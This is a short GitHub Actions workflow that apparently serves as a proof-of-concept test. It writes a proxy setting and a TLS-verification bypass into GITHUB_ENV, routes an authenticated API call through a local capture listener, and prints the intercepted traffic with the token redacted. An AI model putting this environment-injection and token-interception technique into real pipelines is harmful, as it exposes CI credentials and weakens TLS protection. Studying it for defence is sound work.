name: Comprehensive Env Injection V2
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Step 1 — set proxy + capture
        run: |
          # Start capture proxy
          python3 -c "
import socket,threading,os
def h(c,a):
    d=c.recv(4096)
    open('/tmp/cap.txt','ab').write(d+b'\n')
    c.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
    try: d2=c.recv(8192); open('/tmp/cap.txt','ab').write(b'TLS:'+d2+b'\n')
    except: pass
    c.close()
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('127.0.0.1',9999)); s.listen(5); s.settimeout(30)
try:
    while True:
        c,a=s.accept(); threading.Thread(target=h,args=(c,a)).start()
except: pass
s.close()
" &
          sleep 1
          echo "https_proxy=http://127.0.0.1:9999" >> $GITHUB_ENV
          echo "NODE_TLS_REJECT_UNAUTHORIZED=0" >> $GITHUB_ENV

      - name: Step 2 — API call with token via proxy
        env:
          TOK: ${{ github.token }}
        run: |
          curl -v --connect-timeout 5 -H "Authorization: Bearer $TOK" https://api.github.com/user 2>&1 | grep -iE "Connected to|Trying|CONNECT|proxy|Bearer" | head -5 || true
          sleep 2

      - name: Step 3 — show captured
        run: |
          if [ -f /tmp/cap.txt ]; then
            echo "CAPTURED $(wc -c < /tmp/cap.txt) bytes"
            cat /tmp/cap.txt | sed 's/ghs_[A-Za-z0-9]*/ghs_[INTERCEPTED]/g' | head -10
            grep -c "CONNECT" /tmp/cap.txt && echo "CONNECT seen"
          else
            echo "No capture file"
          fi
